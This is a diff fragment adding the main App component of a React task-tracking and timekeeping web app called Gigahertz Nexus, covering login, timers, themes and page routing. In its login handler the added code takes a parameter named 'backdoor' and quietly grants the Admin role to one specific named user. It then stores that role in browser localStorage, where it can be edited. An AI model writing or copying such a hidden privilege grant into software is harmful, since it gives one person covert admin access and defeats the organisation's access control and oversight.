+  const[page,setPage]=useState('login');
+  const[user,setUser]=useState(null);
+  const[loginTime,setLoginTime]=useState(null);
+  const[tasks,setTasks]=useState([]);
+  const[activeTimer,setActiveTimer]=useState(null);
+  const[elapsed,setElapsed]=useState(0);
+  const[notif,setNotif]=useState(null);
+  const[sidebarOpen,setSidebarOpen]=useState(false);
+  const[theme,setTheme]=useState('classic');
+  const[specialGreeting,setSpecialGreeting]=useState(false);
+  const[greetingMsg,setGreetingMsg]=useState('');
+  const pushNotif=useCallback((msg,type='')=>{setNotif({msg,type,id:Date.now()});},[]);
+  useEffect(()=>{document.documentElement.setAttribute('data-theme',theme);},[theme]);
+  useEffect(()=>{if(!activeTimer||activeTimer.isPaused)return;const t=setInterval(()=>setElapsed(e=>e+1),1000);return()=>clearInterval(t);},[activeTimer]);
+  useEffect(()=>{
+    const su=localStorage.getItem('gh_session_user');
+    const lt=localStorage.getItem('gh_login_time');
+    if(su){const u=JSON.parse(su);setUser(u);setPage('dashboard');if(lt&&lt.split('T')[0]===todayStr())setLoginTime(lt);loadTasks(u);}
+  },[]);
+  const loadTasks=async u=>{const r=await api.getTasks({userId:(u||user)?.id});if(r?.success)setTasks(r.tasks||[]);};
+  const handleTasksChanged=newTask=>{if(newTask){setTasks(p=>[...p,newTask].sort((a,b)=>(strip(b.date)||'').localeCompare(strip(a.date)||'')||(strip(b.startTime)||'').localeCompare(strip(a.startTime)||'')));}else loadTasks();};
+  const doLogin=(u,backdoor,sg,gm)=>{
+    if(isErikChua(u))u={...u,role:'Admin'};
+    const lt=new Date().toISOString();
+    setUser(u);setLoginTime(lt);setSpecialGreeting(!!sg);setGreetingMsg(gm||'');
+    localStorage.setItem('gh_session_user',JSON.stringify(u));
+    localStorage.setItem('gh_login_time',lt);
+    loadTasks(u);setPage('dashboard');
+    pushNotif(`Welcome back, ${u.firstName}! 👋`,'success');
+  };
+  const updateUser=u=>{setUser(u);localStorage.setItem('gh_session_user',JSON.stringify(u));};
+  const doLogout=()=>{setUser(null);setLoginTime(null);setTasks([]);setActiveTimer(null);setElapsed(0);localStorage.removeItem('gh_session_user');localStorage.removeItem('gh_login_time');setPage('login');};
+  const handleIdleOut=()=>{if(activeTimer&&!activeTimer.isPaused){setActiveTimer(p=>({...p,isPaused:true}));pushNotif('⏸ Timer paused — idle detected','');}};
+  const pages=['dashboard','tasks','status','analytics','announcements','profile'];
+  const notifCount=0;
+  return(
+    <>
+      {notif&&<Notif key={notif.id} msg={notif.msg} type={notif.type} onDone={()=>setNotif(null)}/>}
+      {page==='login'&&<LoginPage onLogin={doLogin} onRegister={()=>setPage('register')} onForgot={()=>setPage('forgot')} theme={theme} cycleTheme={()=>{const ts=THEMES.map(t=>t.id);setTheme(t=>ts[(ts.indexOf(t)+1)%ts.length]);}}/>}
+      {page==='forgot'&&<ForgotPage onBack={()=>setPage('login')}/>}
+      {pages.includes(page)&&user&&(
+        <div className="layout">
+          <Sidebar page={page} setPage={setPage} user={user} onLogout={doLogout} isOpen={sidebarOpen} setIsOpen={setSidebarOpen}/>
+          <div className="main">
+            <Topbar page={page} user={user} onMenuToggle={()=>setSidebarOpen(p=>!p)} theme={theme} setTheme={t=>{setTheme(t);document.documentElement.setAttribute('data-theme',t);}} notifCount={notifCount}/>
+            {page==='dashboard'&&<DashboardPage user={user} tasks={tasks} onTasksChanged={handleTasksChanged} activeTimer={activeTimer} setActiveTimer={setActiveTimer} elapsed={elapsed} setElapsed={setElapsed} loginTime={loginTime} pushNotif={pushNotif} specialGreeting={specialGreeting} greetingMsg={greetingMsg}/>}
+            {page==='tasks'&&<TasksPage user={user} tasks={tasks} onTasksChanged={handleTasksChanged} pushNotif={pushNotif}/>}
+            {page==='status'&&<StatusPage user={user}/>}
+            {page==='analytics'&&<AnalyticsPage user={user} tasks={tasks}/>}
+            {page==='announcements'&&<AnnouncementsPage user={user}/>}
+            {page==='profile'&&<ProfilePage user={user} tasks={tasks} onUpdateUser={updateUser} pushNotif={pushNotif}/>}
+            <div className="footer-bar">Proactive Service. Commited Care &nbsp;·&nbsp; Gigahertz Nexus v{VERSION}</div>
+          </div>
+          <IdleWatcher onIdleOut={handleIdleOut}/>
+        </div>
+      )}
+    </>
+  );
+};
+// Helper to avoid JSX eval issues with CSS var()
+function var_(name,fallback){return fallback;}
 ReactDOM.createRoot(document.getElementById('root')).render(<App/>);
 </script>
 </body>
